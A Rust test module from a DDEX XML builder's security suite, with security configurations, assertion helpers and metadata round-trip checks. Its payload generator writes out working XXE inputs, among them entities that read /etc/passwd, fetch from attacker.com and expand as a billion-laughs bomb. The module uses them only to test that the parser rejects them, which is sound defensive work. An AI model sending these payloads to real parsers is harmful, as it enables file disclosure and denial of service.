//! Security Test Suite for DDEX Builder
//!
//! This module contains comprehensive security tests for XXE (XML External Entity)
//! attack prevention and other security measures in the DDEX Builder.
//!
//! ## Test Coverage
//!
//! ### XXE Prevention Tests
//! - External DTD references with SYSTEM/PUBLIC identifiers
//! - Billion laughs attacks (exponential entity expansion)
//! - Parameter entity expansion attacks
//! - Local file disclosure attempts (Linux/Windows)
//! - Network request attempts (HTTP/HTTPS/FTP/etc.)
//! - Nested parameter entities
//! - Out-of-band (OOB) data exfiltration
//! - Mixed attack vectors
//!
//! ### Entity Expansion Tests
//! - Classic billion laughs variants
//! - Quadratic blowup attacks
//! - Recursive entity definitions
//! - Parameter entity bombs
//! - Nested entity structures
//! - Memory exhaustion attempts
//! - Entity count limits
//!
//! ### Parameter Entity Tests
//! - File disclosure via parameter entities
//! - Network requests via parameter entities
//! - Parameter entity injection attacks
//! - Parameter entity loops and cycles
//! - Mixed parameter/general entity attacks
//! - Evasion techniques
//!
//! ### Malicious Payload Tests
//! - XML injection in DDEX fields
//! - Script injection attempts
//! - SQL injection in metadata
//! - Path traversal attacks
//! - Command injection
//! - CDATA section abuse
//! - Encoding manipulation
//! - Unicode normalization attacks
//!
//! ### Builder Security Tests
//! - Input validation during build
//! - Output sanitization
//! - Memory exhaustion protection
//! - Build-time XXE prevention
//! - Secure content handling
//! - Rate limiting protection
//!
//! ### Integration Tests
//! - End-to-end security verification
//! - Performance under attack conditions
//! - Error handling and recovery
//! - Logging security
//!
//! ## Security Principles Tested
//!
//! 1. **Defense in Depth**: Multiple layers of security validation
//! 2. **Fail-Safe Defaults**: Secure defaults with explicit opt-in for dangerous features
//! 3. **Input Validation**: All input is validated and sanitized
//! 4. **Output Encoding**: All output is properly encoded for safety
//! 5. **Least Privilege**: Minimal permissions and capabilities
//! 6. **Error Handling**: Secure error messages without information disclosure
//!
//! ## Usage
//!
//! Run all security tests:
//! ```bash
//! cargo test --test security
//! ```
//!
//! Run specific test modules:
//! ```bash
//! cargo test xxe_prevention
//! cargo test entity_expansion
//! cargo test parameter_entity
//! cargo test malicious_payload
//! cargo test builder_security
//! ```

pub mod builder_security_tests;
pub mod entity_expansion_tests;
pub mod integration_tests;
pub mod malicious_payload_tests;
pub mod parameter_entity_tests;
pub mod path_validator_tests;
pub mod xxe_prevention_tests;

use ddex_builder::security::SecurityConfig;

/// Default security configuration for tests
pub fn test_security_config() -> SecurityConfig {
    SecurityConfig::default()
}

/// Restrictive security configuration for high-security tests
pub fn restrictive_security_config() -> SecurityConfig {
    SecurityConfig {
        max_xml_size: 10_000,   // 10KB limit
        max_json_size: 10_000,  // 10KB limit
        max_string_size: 1_000, // 1KB strings
        max_xml_depth: 10,      // Very shallow
        max_attributes_per_element: 10,
        max_child_elements: 100,
        allow_external_entities: false,
        allow_dtd: false,
        rate_limiting_enabled: true,
        max_requests_per_minute: 10, // Very restrictive
        ..SecurityConfig::default()
    }
}

/// Permissive security configuration for testing edge cases
pub fn permissive_security_config() -> SecurityConfig {
    SecurityConfig {
        max_xml_size: 10_000_000,  // 10MB
        max_json_size: 10_000_000, // 10MB
        max_string_size: 100_000,  // 100KB strings
        max_xml_depth: 1000,       // Deep nesting allowed
        max_attributes_per_element: 1000,
        max_child_elements: 100_000,
        allow_external_entities: false, // Still keep this secure
        allow_dtd: false,               // And this
        rate_limiting_enabled: false,   // No rate limiting
        max_requests_per_minute: 1000,
        ..SecurityConfig::default()
    }
}

#[cfg(test)]
mod test_utilities {
    use super::*;
    use ddex_builder::{
        error::BuildError,
        security::{InputValidator, SecureXmlReader},
    };
    use std::io::Cursor;

    /// Helper to test that a given XML payload is blocked by security measures
    pub fn assert_xxe_blocked(xml_content: &str, description: &str) {
        let config = test_security_config();
        let validator = InputValidator::new(config.clone());

        // Test with InputValidator
        let result = validator.validate_xml_content(xml_content);
        assert!(
            result.is_err(),
            "{} should be blocked by InputValidator: {:?}",
            description,
            result
        );

        // Test with SecureXmlReader
        let cursor = Cursor::new(xml_content.as_bytes());
        let mut reader = SecureXmlReader::new(cursor, config);

        let mut buf = Vec::new();
        let mut events_processed = 0;
        let max_events = 100; // Prevent infinite loops in tests

        loop {
            if events_processed >= max_events {
                panic!(
                    "{}: Too many events processed, security measure may not be working",
                    description
                );
            }

            match reader.read_event(&mut buf) {
                Ok(quick_xml::events::Event::Eof) => {
                    // If we reach EOF without error, the security measure might not be working
                    // However, some attacks might be caught at the content level rather than XML level
                    break;
                }
                Ok(_) => {
                    events_processed += 1;
                    buf.clear();
                }
                Err(BuildError::Security(msg)) => {
                    // Expected - security measure is working
                    assert!(
                        msg.contains("DTD")
                            || msg.contains("entity")
                            || msg.contains("external")
                            || msg.contains("bomb")
                            || msg.contains("dangerous")
                            || msg.contains("timeout")
                            || msg.contains("depth")
                            || msg.contains("elements"),
                        "{}: Security error message should be descriptive: {}",
                        description,
                        msg
                    );
                    return;
                }
                Err(_) => {
                    // Other errors are also acceptable as they indicate rejection
                    return;
                }
            }
        }

        // If we get here, check if it was caught by content validation
        if events_processed > 0 {
            println!("Warning: {} was not blocked at XML parsing level but may be caught by content validation", description);
        }
    }

    /// Helper to test that valid XML still works
    pub fn assert_valid_xml_allowed(xml_content: &str, description: &str) {
        let config = test_security_config();
        let validator = InputValidator::new(config.clone());

        let result = validator.validate_xml_content(xml_content);
        assert!(
            result.is_ok(),
            "{} should be allowed: {:?}",
            description,
            result
        );

        // Test with SecureXmlReader
        let cursor = Cursor::new(xml_content.as_bytes());
        let mut reader = SecureXmlReader::new(cursor, config);

        let mut buf = Vec::new();
        let mut events_processed = 0;

        loop {
            match reader.read_event(&mut buf) {
                Ok(quick_xml::events::Event::Eof) => break,
                Ok(_) => {
                    events_processed += 1;
                    buf.clear();
                    if events_processed > 1000 {
                        panic!(
                            "{}: Processing too many events, possible infinite loop",
                            description
                        );
                    }
                }
                Err(e) => {
                    panic!("{} should not produce errors: {:?}", description, e);
                }
            }
        }

        assert!(
            events_processed > 0,
            "{}: Should have processed some XML events",
            description
        );
    }

    /// Helper to generate XXE payloads for testing
    pub fn generate_xxe_payloads() -> Vec<(&'static str, String)> {
        vec![
            (
                "Basic file disclosure",
                r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>"#.to_string()
            ),
            (
                "HTTP external entity",
                r#"<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil.xml">]><root>&xxe;</root>"#.to_string()
            ),
            (
                "Parameter entity file disclosure",
                r#"<!DOCTYPE test [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error;]><test/>"#.to_string()
            ),
            (
                "Billion laughs",
                r#"<!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]><bomb>&c;</bomb>"#.to_string()
            ),
            (
                "Parameter entity network request",
                r#"<!DOCTYPE test [<!ENTITY % remote SYSTEM "http://attacker.com/remote.xml">%remote;]><test/>"#.to_string()
            ),
        ]
    }

    /// Helper to generate valid XML payloads that should pass security
    pub fn generate_valid_xml_payloads() -> Vec<(&'static str, String)> {
        vec![
            (
                "Simple valid XML",
                r#"<root><child>content</child></root>"#.to_string()
            ),
            (
                "XML with attributes",
                r#"<root id="123"><child attr="value">content</child></root>"#.to_string()
            ),
            (
                "XML with CDATA",
                r#"<root><![CDATA[<content>with special chars & symbols</content>]]></root>"#.to_string()
            ),
            (
                "XML with standard entities",
                r#"<root>&lt;content&gt; &amp; &quot;quotes&quot;</root>"#.to_string()
            ),
            (
                "DDEX-like structure",
                r#"<ddex:NewReleaseMessage xmlns:ddex="http://ddex.net/xml/ern/43"><ddex:MessageHeader><ddex:MessageId>MSG123</ddex:MessageId></ddex:MessageHeader></ddex:NewReleaseMessage>"#.to_string()
            ),
        ]
    }
}

pub use test_utilities::*;

/// Helpers that push free-text metadata through the real `DDEXBuilder`.
///
/// Security policy: SQL/HTML/JS-looking text in metadata is not an XML-level
/// threat. The builder must accept it, write it XML-escaped, and a reader of the
/// output must get the original text back.
mod metadata_helpers {
    use ddex_builder::builder::{
        BuildOptions, BuildRequest, DDEXBuilder, LocalizedStringRequest, MessageHeaderRequest,
        PartyRequest, ReleaseRequest, TrackRequest,
    };
    use quick_xml::events::Event;
    use quick_xml::Reader;

    /// Characters that may not appear anywhere in an XML 1.0 document.
    pub fn is_illegal_xml_char(c: char) -> bool {
        matches!(
            c,
            '\u{0}'..='\u{8}' | '\u{B}' | '\u{C}' | '\u{E}'..='\u{1F}' | '\u{FFFE}' | '\u{FFFF}'
        )
    }

    fn localized(text: &str) -> Vec<LocalizedStringRequest> {
        vec![LocalizedStringRequest {
            text: text.to_string(),
            language_code: None,
        }]
    }

    /// A minimal ERN 4.3 request whose free-text fields (release and track
    /// titles, artist names, sender name) all carry `text`.
    pub fn build_request_with_metadata(text: &str) -> BuildRequest {
        crate::ern4_support::ern4_test_data(build_request_with_metadata_base(text))
    }

    fn build_request_with_metadata_base(text: &str) -> BuildRequest {
        BuildRequest {
            header: MessageHeaderRequest {
                message_id: Some("MSG001".to_string()),
                message_sender: PartyRequest {
                    party_name: localized(text),
                    party_id: Some("SENDER".to_string()),
                    party_reference: None,
                },
                message_recipient: PartyRequest {
                    party_name: localized("Recipient"),
                    party_id: Some("RECIPIENT".to_string()),
                    party_reference: None,
                },
                message_control_type: None,
                message_created_date_time: None,
            },
            version: "4.3".to_string(),
            profile: None,
            releases: vec![ReleaseRequest {
                release_id: "REL001".to_string(),
                release_reference: None,
                title: localized(text),
                artist: text.to_string(),
                label: None,
                release_date: None,
                upc: None,
                tracks: vec![TrackRequest {
                    track_id: "TRK001".to_string(),
                    resource_reference: None,
                    isrc: "USRC11111111".to_string(),
                    title: text.to_string(),
                    duration: "PT3M".to_string(),
                    artist: text.to_string(),
                    ..Default::default()
                }],
                resource_references: None,
                ..Default::default()
            }],
            deals: vec![],
            extensions: None,
            ..Default::default()
        }
    }

    /// Build `build_request_with_metadata(text)` and return the XML.
    pub fn build_with_metadata(text: &str) -> String {
        DDEXBuilder::new()
            .build(build_request_with_metadata(text), BuildOptions::default())
            .unwrap_or_else(|e| panic!("builder rejected metadata {:?}: {:?}", text, e))
            .xml
    }

    /// Parse `xml` and return the unescaped text of every element whose local
    /// name is one of `names`. Panics if the document is not well-formed or
    /// carries a DOCTYPE.
    pub fn element_texts(xml: &str, names: &[&str]) -> Vec<String> {
        let mut reader = Reader::from_str(xml);
        let mut texts = Vec::new();
        let mut current: Option<String> = None;
        loop {
            match reader.read_event() {
                Ok(Event::Start(e)) => {
                    let local = String::from_utf8_lossy(e.local_name().as_ref()).to_string();
                    current = names.contains(&local.as_str()).then(String::new);
                }
                Ok(Event::Text(t)) => {
                    if let Some(buf) = current.as_mut() {
                        let raw = std::str::from_utf8(&t).expect("UTF-8 builder output");
                        buf.push_str(
                            &quick_xml::escape::unescape(raw)
                                .expect("valid escapes in builder output"),
                        );
                    }
                }
                // Each reference (`&lt;`, `&amp;`, ...) is its own event since quick-xml 0.38.
                Ok(Event::GeneralRef(r)) => {
                    if let Some(buf) = current.as_mut() {
                        let raw = format!("&{};", String::from_utf8_lossy(&r));
                        buf.push_str(
                            &quick_xml::escape::unescape(&raw)
                                .expect("valid escapes in builder output"),
                        );
                    }
                }
                Ok(Event::End(_)) => {
                    if let Some(text) = current.take() {
                        texts.push(text);
                    }
                }
                Ok(Event::DocType(d)) => panic!("builder output carries a DOCTYPE: {:?}", d),
                Ok(Event::Eof) => break,
                Ok(_) => {}
                Err(e) => panic!("builder output is not well-formed XML: {}\n{}", e, xml),
            }
        }
        texts
    }

    /// Assert that `text` is accepted by the builder, XML-escaped in the output,
    /// and read back unchanged from every metadata element it was written to.
    pub fn assert_metadata_passes_through_builder(text: &str) {
        let xml = build_with_metadata(text);
        let texts = element_texts(&xml, &["TitleText", "FullName", "PartyName"]);
        // release title + track title + release artist + sender name
        assert!(
            texts.iter().filter(|t| t.as_str() == text).count() >= 4,
            "metadata {:?} did not round-trip through the builder output; got {:?}",
            text,
            texts
        );
        if text.contains('<') || text.contains('&') {
            assert!(
                !xml.contains(text),
                "metadata {:?} was written unescaped:\n{}",
                text,
                xml
            );
        }
    }
}

pub use metadata_helpers::*;
